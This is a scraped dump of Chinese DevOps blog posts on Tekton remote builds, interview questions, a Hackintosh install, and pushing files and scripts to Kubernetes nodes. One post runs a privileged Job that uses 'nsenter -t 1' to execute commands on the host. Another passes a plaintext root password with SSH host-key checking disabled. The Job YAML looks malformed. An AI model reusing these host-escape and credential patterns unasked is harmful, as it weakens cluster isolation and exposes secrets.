GitVersion:\u0026#34;v1.19.7\u0026#34;, GitCommit:\u0026#34;1dd5338295409edcfff11505e7bb246f0d325d15\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2021-01-13T13:23:52Z\u0026#34;, GoVersion:\u0026#34;go1.15.5\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;darwin/amd64\u0026#34;} Server Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;20\u0026#34;, GitVersion:\u0026#34;v1.20.2\u0026#34;, GitCommit:\u0026#34;faecb196815e248d3ecfb03c680a4507229c2a56\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2021-01-21T01:11:42Z\u0026#34;, GoVersion:\u0026#34;go1.15.5\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} 3.2 物理机准备 操作系统是 CentOS 7.6 1 2 3 uname -a Linux test 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 预装 Golang 的编译环境 原计划是选择一个 macOS 的构建示例，但是无法提供直通的网络环境，因此换成 Golang 的构建示例。\n1 2 3 go version go version go1.13 linux/amd64 4. 准备 Tekton 以及 Pipeline 资源 4.1 部署 Tekton Pipeline 创建负载 Tekton 默认使用的是 gcr.io 镜像，如果是国内环境可以替换为 gcr.azk8s.cn 镜像。\n1 kubectl apply -f https://github.com/tektoncd/pipeline/releases/download/v0.23.0/release.notags.yaml 查看资源 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 kubectl -n tekton-pipelines get all NAME READY STATUS RESTARTS AGE pod/tekton-pipelines-controller-86c487c965-p6s5t 1/1 Running 0 51s pod/tekton-pipelines-webhook-7b775d9cd8-fzdrq 1/1 Running 0 51s NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/tekton-pipelines-controller ClusterIP 10.233.61.46 \u0026lt;none\u0026gt; 9090/TCP,8080/TCP 51s service/tekton-pipelines-webhook ClusterIP 10.233.46.233 \u0026lt;none\u0026gt; 9090/TCP,8008/TCP,443/TCP,8080/TCP 51s NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/tekton-pipelines-controller 1/1 1 1 51s deployment.apps/tekton-pipelines-webhook 1/1 1 1 51s NAME DESIRED CURRENT READY AGE replicaset.apps/tekton-pipelines-controller-86c487c965 1 1 1 51s replicaset.apps/tekton-pipelines-webhook-7b775d9cd8 1 1 1 51s NAME REFERENCE TARGETS MINPODS MAXPODS REPLICAS AGE horizontalpodautoscaler.autoscaling/tekton-pipelines-webhook Deployment/tekton-pipelines-webhook \u0026lt;unknown\u0026gt;/100% 1 5 1 51s 4.2 资源规划 需要的流水线资源清单:\n一个 task, 用于克隆代码 一个 pv, 用于共享 task 之间的文件 一个自定义的 task, 用于将代码同步到构建机，构建完成之后，再同步回来 一个 pipeline, 用于描述流水线，编排 task 一个 pipelinerun, 用于实例化 pipeline, 提供构建时必要的参数 4.2 编写同步文件、执行脚本的 Task 如上图，这里的 Task 就是用于打通 container 和 vm 之间的文件和进程，实现类似交叉编译的效果。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 --- apiVersion: tekton.dev/v1beta1 kind: Task metadata: name: remote-shell labels: app.kubernetes.io/version: \u0026#34;0.1\u0026#34; annotations: tekton.dev/pipelines.minVersion: \u0026#34;0.12.1\u0026#34; tekton.dev/tags: git tekton.dev/displayName: \u0026#34;remote shell\u0026#34; spec: description: \u0026gt;- This task can be used to run shell in remote machine workspaces: - name: source params: - name: remote-ip type: string - name: remote-port type: string - name: remote-username type: string - name: remote-password type: string - name: remote-workspace type: string - name: remote-script type: string steps: - name: remote-shell image: shaowenchen/rsync-sshpass:v1 workingDir: $(workspaces.source.path) script: | sshpass -p \u0026#34;$(params.remote-password)\u0026#34; ssh -o StrictHostKeyChecking=no \u0026#34;$(params.remote-username)\u0026#34;@\u0026#34;$(params.remote-ip)\u0026#34; -p \u0026#34;$(params.remote-port)\u0026#34; \u0026#34;mkdir -p $(params.remote-workspace)\u0026#34; rsync -ratlz --progress --rsh=\u0026#34;sshpass -p $(params.remote-password) ssh -o StrictHostKeyChecking=no -l $(params.remote-username)\u0026#34; ./ \u0026#34;$(params.remote-ip)\u0026#34;:\u0026#34;$(params.remote-workspace)\u0026#34; sshpass -p \u0026#34;$(params.remote-password)\u0026#34; ssh -o StrictHostKeyChecking=no \u0026#34;$(params.remote-username)\u0026#34;@\u0026#34;$(params.remote-ip)\u0026#34; -p \u0026#34;$(params.remote-port)\u0026#34; \u0026#34;$(params.remote-script)\u0026#34; rsync -ratlz --progress --rsh=\u0026#34;sshpass -p $(params.remote-password) ssh -o StrictHostKeyChecking=no -l $(params.remote-username)\u0026#34; \u0026#34;$(params.remote-ip)\u0026#34;:\u0026#34;$(params.remote-workspace)\u0026#34;/ . 在写法上，可以参考 Tekton 提供的示例。主要分为几步:\n定义参数 编写 step 流程 写 script 这就是一个串脚本的过程，只不过借助容器镜像，省去了安装各种工具的步骤。\n4.3 准备 Tekton 的 pipeline 描述 克隆代码 Task Tekton 已经正式上线 Hub 服务，用于共享 Task，这里直接使用 https://hub.tekton.dev/tekton/task/git-clone\n1 kubectl apply -f https://raw.githubusercontent.com/tektoncd/catalog/main/task/git-clone/0.3/git-clone.yaml 构建一个工具箱镜像 shaowenchen/rsync-sshpass:v1 Dockerfile 为:\n1 2 3 4 5 6 7 8 9 10 11 12 13 ARG alpine_ver=3.13 FROM alpine:${alpine_ver}.5 RUN apk update \\ \u0026amp;\u0026amp; apk upgrade \\ \u0026amp;\u0026amp; apk add --no-cache \\ rsync \\ openssh-client \\ openssh \\ sshpass \\ ca-certificates \\ \u0026amp;\u0026amp; update-ca-certificates \\ \u0026amp;\u0026amp; rm -rf /var/cache/apk/* pipeline 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 apiVersion: tekton.dev/v1beta1 kind: Pipeline metadata: name: remote-build-pipeline spec: params: - name: repo-url type: string - name: branch-name type: string - name: remote-ip type: string - name: remote-port type: string - name: remote-username type: string - name: remote-password type: string - name: remote-workspace type: string - name: remote-script type: string workspaces: - name: shared-data tasks: - name: fetch-repo taskRef: name: git-clone workspaces: - name: output workspace: shared-data params: - name: url value: $(params.repo-url) - name: revision value: $(params.branch-name) - name: remote-build taskRef: name: remote-shell runAfter: [\u0026#34;fetch-repo\u0026#34;] workspaces: - name: source workspace: shared-data params: - name: remote-ip value: $(params.remote-ip) - name: remote-port value: $(params.remote-port) - name: remote-username value: $(params.remote-username) - name: remote-password value: $(params.remote-password) - name: remote-workspace value: $(params.remote-workspace) - name: remote-script value: $(params.remote-script) pipeline 包含两个 task，一个 task 克隆代码，一个 task 执行远程构建。\npipelinerun 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 --- apiVersion: tekton.dev/v1beta1 kind: PipelineRun metadata: name: remote-build-pipelinerun-1 spec: pipelineRef: name: remote-build-pipeline workspaces: - name: shared-data volumeClaimTemplate: spec: accessModes: - ReadWriteOnce resources: requests: storage: 10Gi params: - name: repo-url value: https://github.com/shaowenchen/terraform-provider-qingcloud.git - name: branch-name value: master - name: subdirectory value: terraform-provider-qingcloud-001 - name: remote-ip value: 0.0.0.0 - name: remote-port value: \u0026#34;22\u0026#34; - name: remote-username value: root - name: remote-password value: YourPassword - name: remote-workspace value: ~/workspaces/terraform-provider-qingcloud-001 - name: remote-script value: | cd ~/workspaces/terraform-provider-qingcloud-001 make 这里将克隆代码到 pv 的 terraform-provider-qingcloud-001 目录，同步到构建机的 ~/workspaces/terraform-provider-qingcloud-001 目录。也就是说，这两个目录最终的文件会保持一致，而构建的二进制是在构建机上生成的。\n查看 Tekton 资源定义 以上资源全部 apply 之后，就可以查看相关的资源和流水线状态了。\n1 2 3 4 5 kubectl get tasks.tekton.dev NAME AGE git-clone 18m remote-shell 5m47s 1 2 3 4 kubectl get pipelines.tekton.dev NAME AGE remote-build-pipeline 4m21s 1 2 3 4 kubectl get pipelineruns.tekton.dev NAME SUCCEEDED REASON STARTTIME COMPLETIONTIME remote-build-pipelinerun-1 True Succeeded 6m15s 5m42s 在 pipelineruns 中可以通过 describe 拿到整个流水线执行的记录，用于展示执行步骤，查询构建日志。下面是截取的部分内容:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 Task Runs: remote-build-pipelinerun-1-fetch-repo-56ws8: Pipeline Task Name: fetch-repo Status: Completion Time: 2021-04-27T13:22:08Z Conditions: Last Transition Time: 2021-04-27T13:22:08Z Message: All Steps have completed executing Reason: Succeeded Status: True Type: Succeeded Pod Name: remote-build-pipelinerun-1-fetch-repo-56ws8-pod-mgx77 Start Time: 2021-04-27T13:21:54Z Steps: Container: step-clone Image ID: docker-pullable://gcr.io/tekton-releases/github.com/tektoncd/pipeline/cmd/git-init@sha256:db18a9c1607c8cbbcd72f61d0c4d795b9ff528669deacd5f8a1672e4ef198ffd Name: clone Terminated: Container ID: docker://e5258bc7b0770e0333a93395eda13514abbd293652c0c0494352407a3fbc1a7f Exit Code: 0 Finished At: 2021-04-27T13:22:07Z Message: [{\u0026#34;key\u0026#34;:\u0026#34;commit\u0026#34;,\u0026#34;value\u0026#34;:\u0026#34;d024b4deeb2f328098fed88eb702cb19dac8452f\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;TaskRunResult\u0026#34;},{\u0026#34;key\u0026#34;:\u0026#34;url\u0026#34;,\u0026#34;value\u0026#34;:\u0026#34;https://github.com/shaowenchen/terraform-provider-qingcloud.git\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;TaskRunResult\u0026#34;}] Reason: Completed Started At: 2021-04-27T13:22:04Z Task Results: Name: commit Value: d024b4deeb2f328098fed88eb702cb19dac8452f Name: url Value: https://github.com/shaowenchen/terraform-provider-qingcloud.git 5. 功能验证 查看相关负载 1 2 3 4 5 kubectl get pod NAME READY STATUS RESTARTS AGE remote-build-pipelinerun-1-fetch-repo-56ws8-pod-mgx77 0/1 Completed 0 8m49s remote-build-pipelinerun-1-remote-build-wxtms-pod-bcn6r 0/1 Completed 0 8m35s 在物理构建机上，查看构建目录 1 2 3 4 5 6 7 8 pwd /root/workspaces/terraform-provider-qingcloud-001 ls CHANGELOG.md glide.yaml go.sum main.go qingcloud scripts terraform-provider-qingcloud website dev.md go.mod LICENSE Makefile README.md terraform vendor 查看 Kubernetes PV 的构建目录 1 2 3 4 kubectl get pv NAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS pvc-860016bb-14b6-414a-9c5a-1a71d7290ba8 10Gi RWO Delete Bound default/pvc-e7ceb0582a openebs-hostpath 2m12s 查找 PV 存储路径\n1 2 3 kubectl describe pv pvc-860016bb-14b6-414a-9c5a-1a71d7290ba8 |grep Path Path: /var/openebs/local/pvc-860016bb-14b6-414a-9c5a-1a71d7290ba8 查看 PV 目录文件结构\n1 2 3 4 ls /var/openebs/local/pvc-860016bb-14b6-414a-9c5a-1a71d7290ba8 CHANGELOG.md glide.yaml go.sum main.go qingcloud scripts terraform-provider-qingcloud website dev.md go.mod LICENSE Makefile README.md terraform vendor 在两个目录中，都存在构建产物 terraform-provider-qingcloud，符合预期，也说明我们达成了目标。\n6. 总结 传统的 CICD 引擎通常是一个 C/S 架构。它需要一个 S 端，用于解析流程，对流水线进行调度; 需要很多个 C 端，用于执行高负载的构建任务。这种方式的扩展性并不是线性的，在云原生下、业务量大时很容易遇到瓶颈。因此，我们需要更加云原生的构建引擎。在新的引擎下我们需要解决一些老的问题，支持物理机构建就是其中之一。\n本文主要以 Tekton 为例，提供了一种利用 rsync 和 sshpass 接入物理机进行构建的思路。其中的关键点如下:\n使用 rsync\\sshpass 的目的主要是将容器与物理机绑定，文件双向同步，进程空间互通。 不限于 Tekton, 任意的引擎都可以使用这种方式。 这里仅是作为方案验证，如果落地到产品，还需要考虑缓存、秘钥安全、数据安全、租户隔离等问题。 7. 参考 https://github.com/shaowenchen/demo/tree/master/tekton-remote-build ","description":"","id":227,"section":"post","tags":["博文","Tekton","云原生","Kubernetes","CICD","DevOps"],"title":"Tekton 如何接入物理机进行构建","uri":"https://www.chenshaowen.com/blog/how-to-add-physical-machines-to-tekton.html"},{"content":"计算机基础 堆和栈 什么时候用堆？什么时候用栈？栈有什么作用？Golang 的变量在栈还是堆？堆、栈有没有上限？有的话和什么有关？\n数据结构 Slice 空间是怎样分配的？双倍扩容，原来数据复制过去。\nGolang 的 map 是什么结构\tGolang 的 map 是什么结构，遍历是否有序， 什么是 Hash 表？ Hash 表的查询效率？ 解决碰撞有什么方法？\n线程 线程是否越多越好吗？ 线程切换消耗大不大？\n协程是否越多越好吗？要区分线程调度（内核上下文切换）与协调调度时（进程内上下文切换）机制。\n网络 TCP 协议 TCP 建立过程是怎样的，最要的工作是什么？协商序列号。\nTCP 关闭过程，为什么要四次挥手？因为TCP是全双工的。\nClient -\u0026gt; Server, Client 主动关闭链接， TIME_WAIT 发生在那端？服务器有很多 TimeWait 一般是什么情况\t主动关闭端。有很多 Timewait 证明是服务主动关闭连接，存在有很多短链接。\nClient 和 Server 已建立了 TCP 连接， Client 正在调用 Read 阻塞，Server 进程崩溃后，Client 会怎样? 进程崩溃，操作系统会关闭文件描述符，Sever 进入主动关闭流程。\n通过 TCP 传输文件，为什么还需要对收到的文件做正确性校验?\nHTTP 协议 简述 http 协议格式，文本协议能不能传输二进制？http 可传输图片的方法（content-length）。\nhttp 与 https 关系是什么？简述 https 协议作用，描述出 https 握手过程的加分 。\n什么是 http 中 的 keepalive，怎样做到 keepalive ？ http1.1 才支持 keepalive，一个 tcp 连接顺序发送请求（遵守一问一答顺序），http2.0 多路复用。\n数据库 索引知识 数据库索引使用了什么数据结构？为什么要使用这个数据结构?\n一个表的字符串字段 A 已经建立了索引，使用查询条 A == \u0026lsquo;abc\u0026rsquo; 是否能用上索引？使用查询条A != \u0026lsquo;abc\u0026rsquo; 是否能用上索引？为什么？因为 A！=\u0026lsquo;abc\u0026rsquo; 在 B+ 树查找过程无法比较大小，无法进一步定位孩子树\n有个表 a 有主键 id， 说明一下 select * from a order by id desc limit 10, 1 和 select*from a order by id desc limit 100000, 1 的效率差别? offset 为多少，就要遍历多少\n一个表有一个联合索引（A，B），如果查询用 A=1 能用上索引吗，B=2 呢，为什么?\nlimit 的局限 用什么办法遍历一个有主键 id 的 3 亿数据表\n算法 算法能力考察 有一个 100 万个不相等的乱序的整数， 用最快方法将其分成相等的两部分，要求前一部分每个数都比后一部分每个数小？使用快速排序的思路\n在内存中有 100 组有序数组， 每组 10 万个元素，用最快方法将他们合并成一个有序的数组。使用堆\n基本知识 如何判断一个链表有闭环\nGolang 多线程编程 如果多个线程并发读写一个 map，会产生什么结果？为什么会产生这种结果？有什么办法保证并发安全？\nGolang 中对一个 int64 进行高并发更新（增减），有什么办法保证并发安全？\t并发编程的理解，可以有 3 种方式：（1）锁（2）atomic包（3）channel - 多生产者单消费者\n协程，线程，进程 描述 goroutine 调度、切换机制。\nChannel Golang\tchan特性\tchan 为什么不用锁,底层是怎么实现的？\n什么时候会阻塞，怎么判断会阻塞？\t1）chan底层是用了锁+双向队列实现。2)投递前可cap、len函数判断是否相等，但要锁住。第2个方法是用select default，实际编程中select必需加 default处理逻辑。\nRedis 基本数据结构 string、list、set、zset、hash，每种数据结构的使用场景，实现原理\nRedis\tRedis 用法如何用 Redis 实现一个分布式锁\t最初级的回答是SETNX。更好的回答是考虑到原子性，用 Lua 脚本\n原理 Redis对设置了TTL的key，是如何实现key的过期的？\t能回答出 2 种过期方式：主动和被动（惰性）。如果能回答出主动方式的随机抽样流程，加分。\nRedis的key淘汰策略有哪些？ 各有什么特点？常用的有volatile-lru、volatile-ttl。LRU 算法的流程是什么\nredis 有没有 stop the world 问题？什么时候会出现？为什么？回答:redis 是单进程、单线程服务，单个任务处理时间过长，就严重影响并发性能。如持久化时、处理返回大 values 值数据时、从一个很长的 list 中删除一个元素时等场景。\n系统设计 短网址服务 输入一个长网址，编码返回一个短网址（重点是编码方法的考虑，比如用什么方式表示短网址，能表示的量有多大）\n如何通过短网址找到长网址？\nHTTP重定向是选301还是302？\t（1）编码方式：用ID生成器生成一个64bit整数，然后把这个整数编码成英文数字的字符串（注意考虑要多长的字符串？），如果回答md5之类的hash方法的，会有冲突问题。\n通过kv存储，key是短网址，value是长网址，redis mysql都可以\n301（永久重定向）和302（临时重定向）的区别主要在于搜索引擎的行为。如果想要统计用户请求信息，用302.\n高并发 ID 生成服务 全局唯一\nID体积尽可能小\nID按照时间有序\n","description":"","id":228,"section":"post","tags":["博文","研发","面试"],"title":"一些常见的计算机面试题","uri":"https://www.chenshaowen.com/blog/some-common-computer-interview-questions.html"},{"content":" 大概是十年前，我在笔记本上安装过 macOS。当时最头疼的是只有特定的硬件才能安装成功，而且还缺各种驱动程序。后来自己买了 Mac 笔记本，很长时间没有关注如何在通用机器上安装 macOS 。最近拿到了一台 Dell 台式机，配置还不错，又尝试了一下。本文主要是记录这一过程。\n1. Dell OptiPlex 7080MT 物理机配置 下面是机器的配置：\nCPU Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz(2904 MHz)\n主板 Dell 0J37VM\n内存 16.00 GB (2666 MHz)\n主硬盘 250 GB SSD + 1 TB HDD\n显卡 Intel(R) UHD Graphics 630 (1024 MB)\n网卡 Intel(R) Ethernet Connection (11) I219-LM\n从柜子里面翻出了一个 CSR 蓝牙适配器，插入 USB 孔可以直接使用。\n2. 安装 macOS 这里主要参考文档: https://blog.daliansky.net/macOS-BigSur-11.2.3-20D91-Release-version-with-OC-0.6.7-and-Clover-5131-and-PE-original-image.html\n2.1 下载 macOS 镜像和刻录工具 镜像下载地址: OndeDrive\n刻录工具: etcher\n2.2 刻录 U 盘启动盘 如果是 Windows 下，需要以管理员权限运行。操作过程非常简单，选择镜像，选择刻录的 U 盘，点击 Flash 即可。如下图:\n上面下载的是二合一镜像，也就是 U 盘中会有两个引导，一个是 macOS，一个是 WinPE 。\n2.3 设置 BIOS 设置项 值 SATA Operation AHCI Integrated NIC Enabled Secure Boot Enable unChecked Secure Boot Mode Audit Mode SGX Disabled SpeedStep Enable C-States Control Checked Turboost Enable HyperThread Control Enable Intel Speed Shift Technology Enable Deep Sleep Control Disabled USB Wake Support unChecked Wake on LAN/WLAN Lan only Block Sleep unChecked Fastboot Minimal Virtualization Enable VT For Direct I/O unChecked ASPM Auto 2.4 安装 macOS 重新启动计算机，按住 F12，选择 U 盘启动。\n使用 [Disk Utility] 工具将 SSD 格式为 APFS 格式的 GUID 分区。GUID 分区会预留一个 EFI 分区，用来告诉 BIOS 引导信息。\n安装 macOS 到 SSD 盘上\n2.5 替换 EFI 文件 不同的硬件需要不同的 EFI 文件。在成功安装 macOS 之后，不一定能引导进入系统，需要制作 EFI 文件。\n幸运的是，有玩家已经制作了 Dell Optiplex 7080MT 的 EFI 文件。参考链接: https://github.com/shaowenchen/dell-optiplex-7080mt-hackintosh-opencore 。\n这里只需要进入 U 盘中的 WinPE 系统，然后使用 DiskGenius 工具，将适配硬件的 EFI 文件夹覆盖 SSD 中引导分区中的 EFI 文件夹即可。\n2.6 最终的效果 由于有两块硬盘 SSD + HDD 。我将 HDD 分为两个分区，800 GB 用来存储数据，200 GB 设置 Time Machine 备份。\n3. 其他遇到的问题 3.1 Google Drive 一直无法同步 Google Drive 针对个人提供的是同步备份盘，也就是能将 Google Drive 中的数据与本地目录保持同步。\n之前使用时，一直登录不上，之后又时不时断开了链接，不能正常同步。这次发现是由于没有设置系统代理导致。\n另外一种方式是直接在代理工具中，勾选相关配置，即可自动注入 Proxy。\n3.2 HDD 硬盘安装之后，迁移到 SSD 最开始，由于 SSD 上已经安装了 Windows，我将 macOS 安装到 HDD 上。在使用 macOS 的过程中发现，Spotlight 很慢，打开应用也经常转圈圈，因此决定迁移到 SSD 上。下面是迁移步骤:\n将 SSD 盘格式为 APFS 格式的 GUID 分区，命名为 imac 使用 U 盘 WinPE 系统的 DiskGenius 工具拷贝 HHD 中 EFI 文件到 SSD 中 EFI 文件 将 SSD 分区缩小，新增一个分区 backup 将 HDD 上的 macOS 系统使用 Time Machine 备份到 backup 使用 U 盘启动计算机，安装一个新系统到 SSD 的 imac 分区。这里安装时，自动识别出了 backup ，开机即进行了恢复。如果没有识别，需要使用 Time Machine 手动进行恢复。 删除 backup 分区，扩容到 imac 分区。 至此，就迁移完成了。\n3.3 USB Wifi 网卡驱动 https://chris1111.github.io/D-LinkUtility-Package/\n","description":"","id":229,"section":"post","tags":["博文","Kubernetes","Docker","PaaS"],"title":"在 Dell OptiPlex 7080MT 上安装 macOS 操作系统","uri":"https://www.chenshaowen.com/blog/how-to-install-macos-on-dell-optiplex-7080.html"},{"content":"1. 本文主要讨论什么 勿在浮沙筑高台。业务量的增长、业务形态的进化都需要坚实强劲的 IT 系统支撑。业务内容对市场是透明的，但是 IT 系统不是一朝一夕能建设完善的。未来公司之间的竞争主要也会来自于 IT 系统之间的竞争，能不能快速响应业务需求是决胜的关键。\nIT 系统也在不断进化。建设高效、智能的 IT 系统成本是很高的。刚开始只需要够用，接着是好用，最后成为核心竞争力。\n变化并不可怕，可怕的是沉重的历史包袱。对于技术人员来说，新需求不是什么难事，难的是在高速飞行状态下更换部件。既能保证原有功能正常，又能满足新的需求，还要更替 IT 基础设施。\n在进行容器化、Kubernetes 化转变的过程中，如何直接给虚拟机 (VM) 分发文件，在虚拟机上执行脚本是本文思考的重点。直接操作虚拟机，不符合云原生不可变的基础设施定义，但历史业务场景要求，作为 IT 平台方需要提供解决方案。本文将对此给出答案。\n2. 为什么需要一个 PaaS 平台 当一个 IT 运维团队开始建设 PaaS 时，他们才真正算站起来了。\n在目前的环境下，业务模式、形态不再是商业机密。信息、人员的快速流动，让公司之间赤裸对峙。你有的业务，我也可以有；我有的功能，你也可以加。业务短时间爆发增长的时代已过，我们正处于一个精细化运营、数据化决策的时代。\n新时代对 IT 系统有着更多的需求，这些需求在传统模式下是无法满足的。传统的模式是针对特定的场景开发 SaaS 服务，将技能封装在固定的流程中，降本增效，控制风险。这在早期也够用，但随着业务规模发展，运维人员会陷入无休止地加班改功能、加功能的状态。\nPaaS 的目的是为了抽象一些公共的功能。中台也是这样建设的，不变的领域实现落地到平台，对外提供服务接口。让前端直接与业务绑定在一起，应对市场的快速变化。\n当有 PaaS 平台时，IT 技能才会有一个沉淀的方向，IT 人员才能从重复、繁杂的任务中抽离出来思考业务，通过拼装才能快速支撑业务。\n3. 如何实现文件分发、脚本执行 3.1 在传统 PaaS 平台下 如果让一个运维人员批量分发一个文件、执行一个脚本，他使用 Ansible 可以很快实现。\n但是上面提到要解放双手，建设 PaaS 平台。下面是一张传统的 IT 设施架构图:\n在传统的 IT 流程中，购买的每一台机器都需要在 CMDB 中注册登记，然后安装 Agent 进行管理。通过 Agent 提供的文件、脚本管道，上层的平台可以实现文件分发、脚本执行的功能。\n但 Agent 的开发成本很高。无数次的业务故障才能打磨出一个高并发、高性能、高可用、高稳定性、高安全性的 Agent。在一些开源的解决方案中，Agent 作为公司 IT 核心不会开放源码。\n3.2 在 Kubernetes 下 在云原生的背景下，直接修改 IaaS 层 VM 的状态是不被允许的，称之为不可变的基础设施。在有些实践中，甚至会禁用容器的 SSHD，一旦有 SSH 登录，容器会即刻退出。\n在 Kubernetes 下是不提倡直接向节点分发文件、执行脚本的。\n不可变的基础设施 (IaC) 的逻辑是为了保证状态能复现，符合声明式的语义。直接修改基础设施是一个过程式的操作，基础设施处于正在运行的状态，存在很多的不确定性，无法准确描述。\n下面是云原生下的 IT 设施架构图:\nKubernetes 接管了 IaaS 层的资源，控制着整个系统的运作。而业务的服务主要通过镜像仓库下发，业务的日志采集和监控还需要借助其他开源组件。\n4. Kubernetes 分发文件、执行脚本计划 4.1 演练的准备 下面是清单:\n一个 Kuberentes 集群，需要能执行 kubectl 命令 待分发的 VM 已经添加到集群节点中 Docker 环境以及 Dockerhub 账户 4.2 演练的内容 演练分为如下步骤:\n准备执行的脚本和文件 构建并推送镜像 创建 Kubernetes Job 进行分发 4.3 演练的目标 演练的目标如下:\n在虚拟机上运行一个 Web 服务，提供文件下载功能 将一个文件分发到虚拟机，并添加到下载服务中 5. Kubernetes 分发文件、执行脚本 5.1 集群描述 1 2 3 4 kubectl get node -o wide NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME test Ready master,worker 6d2h v1.17.9 10.160.6.35 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 3.10.0-957.21.3.el7.x86_64 docker://20.10.6 由于预算有限，这里没有布置多节点的环境。但为了贴合真实场景，在执行 Job 时会使用 nodeSelector 选择指定的节点，而不会让分发过程失控。\n5.2 准备分发文件、执行脚本 文件目录结构 demo Dockerfile start.sh 以下构建镜像相关的命令都是在 demo 目录中执行。\n脚本 start.sh 内容 1 2 cd /data nohup python -m SimpleHTTPServer 8000\u0026amp; Kubernetes 集群使用的是 CentOS 7 操作系统，自带 Python 2 的解释器。这里为了简单，使用 SimpleHTTPServer 提供下载服务。\nDockerfile 内容 1 2 3 FROM docker.io/alpine:3.12 ARG file ADD ${file} /data/ 待分发的文件内容 文件可以是构建环境中的本地文件，也可以是任意的 URL 文件链接。这里我选择的是一个 PDF 的文件链接:\nhttps://www.chenshaowen.com/static/file/ui-autotest.pdf\n5.3 构建镜像 在 Kubernetes 中通用的是 OCI 镜像，因此需要对文件、脚本进行封装，将文件、脚本打包到镜像中，通过镜像仓库进行分发。\n将待分发的文件打包到镜像中 1 docker build --build-arg file=https://www.chenshaowen.com/static/file/ui-autotest.pdf -t shaowenchen/file-1:latest ./ 推送镜像：\n1 docker push shaowenchen/file-1:latest 将待执行的脚本打包到镜像中 1 docker build --build-arg file=./start.sh -t shaowenchen/shell-1:latest ./ 推送镜像：\n1 docker push shaowenchen/shell-1:latest 查看 Dockerhub 中的镜像 5.4 Kubernetes 节点预处理 除了待分发的节点需要添加到 Kubernetes 集群，另外一个重要的地方是需要对节点进行预处理。\n节点预处理主要是给节点添加 label，对节点进行标记，便于准确分发。在生产中，通常网络是分区的，因此引入两个维度的标记：zone 和 ip。\n标记节点 zone 、ip zone 表示分区，这里标记为 a。ip 表示虚拟机在这个分区中的 IP 地址。在实践过程中，可以在安装 Kubernetes 集群时批量处理。\n1 2 kubectl label node test zone=a kubectl label node test ip=10.160.6.35 查看标记的标签 1 2 3 4 kubectl get nodes --show-labels NAME STATUS ROLES AGE VERSION LABELS test Ready master,worker 6d2h v1.17.9 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,ip=10.160.6.35,kubernetes.io/arch=amd64,kubernetes.io/hostname=test,kubernetes.io/os=linux,node-role.kubernetes.io/master=,node-role.kubernetes.io/worker=,zone=a 5.5 向指定节点分发脚本并执行 这里主要是利用 hostpath 将容器中的文件挂载到主机上，然后利用 nsenter 进入主机的命名空间进行操作。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: batch/v1 kind: Job metadata: name: shell-1 spec: template: spec: containers: - name: shell-1 spec: containers: - name: shell-1 command: [\u0026#34;sh\u0026#34;] args: [\u0026#34;-c\u0026#34;, \u0026#34;cp /data/start.sh /hostdata/; echo \u0026#39;sh /data/start.sh\u0026amp;\u0026#39; | nsenter -t 1 -m -u -i -n;sleep 99999\u0026#34;] image: shaowenchen/shell-1:latest securityContext: privileged: true volumeMounts: - name: hostdata mountPath: /hostdata hostIPC: true hostNetwork: true hostPID: true volumes: - name: hostdata hostPath: path: /data/ restartPolicy: Never nodeSelector: zone: a ip: 10.160.6.35 EOF 由于镜像很小，很快脚本就能得到执行。登录到虚拟机上，查看是否有相关的服务进程:\n1 2 3 4 ps aux |grep SimpleHTTPServer root 16523 0.1 0.0 198028 10120 ? S 22:38 0:00 python -m SimpleHTTPServer 8000 root 17558 0.0 0.0 112684 1000 pts/1 S+ 22:39 0:00 grep --color=auto SimpleHTTPServer 表明 SimpleHTTPServer 服务已经在虚拟机上运行成功\n5.6 向指定节点分发文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: batch/v1 kind: Job metadata: name: file-1 spec: template: spec: containers: - name: file-1 spec: containers: - name: file-1 command: [\u0026#34;sh\u0026#34;] args: [\u0026#34;-c\u0026#34;, \u0026#34;cp -R /data/* /hostdata/; sleep 10\u0026#34;] image: shaowenchen/file-1:latest securityContext: privileged: true volumeMounts: - name: hostdata mountPath: /hostdata hostIPC: true hostNetwork: true hostPID: true volumes: - name: hostdata hostPath: path: /data/ restartPolicy: Never nodeSelector: zone: a ip: 10.160.6.35 EOF 通过页面访问，可以查看到提供的下载页面:\n在虚拟机上查看分发的文件:\n1 2 3 ls /data/ start.sh ui-autotest.pdf 6. 总结 本文主要是在 Kubernetes 下，演示了面向虚拟机如何进行文件分发、脚本执行，给大家在设计 PaaS 平台时提供一点思路。\n将 Kubelet 当做传统的 